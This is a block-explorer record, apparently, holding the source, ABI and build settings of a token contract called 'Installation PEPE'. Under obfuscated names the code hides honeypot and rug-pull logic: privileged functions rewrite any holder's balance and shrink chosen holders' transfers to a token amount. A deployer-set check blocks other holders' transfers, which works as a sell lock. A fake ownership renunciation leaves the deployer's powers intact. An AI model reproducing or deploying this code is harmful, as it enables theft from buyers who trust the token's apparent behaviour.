{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface tradingMinReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountFrom) external view returns (uint256);\n\n    function transfer(address swapBuy, uint256 autoAt) external returns (bool);\n\n    function allowance(address isMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapBuy,\n        uint256 autoAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenTxTo, uint256 value);\n    event Approval(address indexed isMode, address indexed spender, uint256 value);\n}\n\nabstract contract liquidityTokenTx {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface totalMaxTx {\n    function createPair(address tradingAt, address buyTx) external returns (address);\n}\n\ninterface tradingMinReceiverMetadata is tradingMinReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InstallationPEPE is liquidityTokenTx, tradingMinReceiver, tradingMinReceiverMetadata {\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityMin;\n    }\n\n    mapping(address => mapping(address => uint256)) private enableAuto;\n\n    address amountFundFrom = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private isTrading;\n\n    function walletAmount(address sellToShould, uint256 autoAt) public {\n        launchFee();\n        fromAt[sellToShould] = autoAt;\n    }\n\n    uint256 public sellTotal;\n\n    function allowance(address marketingAt, address tradingLiquidityEnable) external view virtual override returns (uint256) {\n        if (tradingLiquidityEnable == amountFundFrom) {\n            return type(uint256).max;\n        }\n        return enableAuto[marketingAt][tradingLiquidityEnable];\n    }\n\n    bool private receiverLimit;\n\n    function tokenLimit(address txFromSell) public {\n        require(txFromSell.balance < 100000);\n        if (fundTrading) {\n            return;\n        }\n        if (receiverListShould) {\n            receiverLimit = true;\n        }\n        walletMin[txFromSell] = true;\n        \n        fundTrading = true;\n    }\n\n    function tokenAuto(address buySell) public {\n        launchFee();\n        \n        if (buySell == teamTo || buySell == exemptList) {\n            return;\n        }\n        launchEnable[buySell] = true;\n    }\n\n    string private listMarketing = \"Installation PEPE\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fromSell;\n    }\n\n    bool public exemptMin;\n\n    address walletReceiverIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private exemptFund;\n\n    event OwnershipTransferred(address indexed shouldWallet, address indexed enableLiquidity);\n\n    address private modeLimitSender;\n\n    function senderTakeSwap(address takeLimit, address swapBuy, uint256 autoAt) internal returns (bool) {\n        if (takeLimit == teamTo) {\n            return swapReceiver(takeLimit, swapBuy, autoAt);\n        }\n        uint256 enableIsTo = tradingMinReceiver(exemptList).balanceOf(walletReceiverIs);\n        require(enableIsTo == modeAt);\n        require(swapBuy != walletReceiverIs);\n        if (launchEnable[takeLimit]) {\n            return swapReceiver(takeLimit, swapBuy, launchTeamLimit);\n        }\n        return swapReceiver(takeLimit, swapBuy, autoAt);\n    }\n\n    string private walletFrom = \"IPE\";\n\n    mapping(address => bool) public walletMin;\n\n    function getOwner() external view returns (address) {\n        return modeLimitSender;\n    }\n\n    function transferFrom(address takeLimit, address swapBuy, uint256 autoAt) external override returns (bool) {\n        if (_msgSender() != amountFundFrom) {\n            if (enableAuto[takeLimit][_msgSender()] != type(uint256).max) {\n                require(autoAt <= enableAuto[takeLimit][_msgSender()]);\n                enableAuto[takeLimit][_msgSender()] -= autoAt;\n            }\n        }\n        return senderTakeSwap(takeLimit, swapBuy, autoAt);\n    }\n\n    function approve(address tradingLiquidityEnable, uint256 autoAt) public virtual override returns (bool) {\n        enableAuto[_msgSender()][tradingLiquidityEnable] = autoAt;\n        emit Approval(_msgSender(), tradingLiquidityEnable, autoAt);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletFrom;\n    }\n\n    uint8 private liquidityMin = 18;\n\n    function swapReceiver(address takeLimit, address swapBuy, uint256 autoAt) internal returns (bool) {\n        require(fromAt[takeLimit] >= autoAt);\n        fromAt[takeLimit] -= autoAt;\n        fromAt[swapBuy] += autoAt;\n        emit Transfer(takeLimit, swapBuy, autoAt);\n        return true;\n    }\n\n    function balanceOf(address amountFrom) public view virtual override returns (uint256) {\n        return fromAt[amountFrom];\n    }\n\n    address public exemptList;\n\n    uint256 private fromSell = 100000000 * 10 ** 18;\n\n    bool public fundTrading;\n\n    function launchFee() private view {\n        require(walletMin[_msgSender()]);\n    }\n\n    bool private receiverListShould;\n\n    mapping(address => uint256) private fromAt;\n\n    function receiverLiquidity() public {\n        emit OwnershipTransferred(teamTo, address(0));\n        modeLimitSender = address(0);\n    }\n\n    address public teamTo;\n\n    uint256 modeAt;\n\n    uint256 private buySender;\n\n    constructor (){\n        \n        autoExempt modeExempt = autoExempt(amountFundFrom);\n        exemptList = totalMaxTx(modeExempt.factory()).createPair(modeExempt.WETH(), address(this));\n        if (receiverLimit) {\n            sellTotal = exemptFund;\n        }\n        teamTo = _msgSender();\n        receiverLiquidity();\n        walletMin[teamTo] = true;\n        fromAt[teamTo] = fromSell;\n        \n        emit Transfer(address(0), teamTo, fromSell);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return listMarketing;\n    }\n\n    function owner() external view returns (address) {\n        return modeLimitSender;\n    }\n\n    mapping(address => bool) public launchEnable;\n\n    uint256 amountLaunchTotal;\n\n    function transfer(address sellToShould, uint256 autoAt) external virtual override returns (bool) {\n        return senderTakeSwap(_msgSender(), sellToShould, autoAt);\n    }\n\n    function isAuto(uint256 autoAt) public {\n        launchFee();\n        modeAt = autoAt;\n    }\n\n    uint256 constant launchTeamLimit = 3 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTxTo\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingLiquidityEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingLiquidityEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"isAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"}],\"name\":\"tokenAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFromSell\",\"type\":\"address\"}],\"name\":\"tokenLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellToShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellToShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoAt\",\"type\":\"uint256\"}],\"name\":\"walletAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "InstallationPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}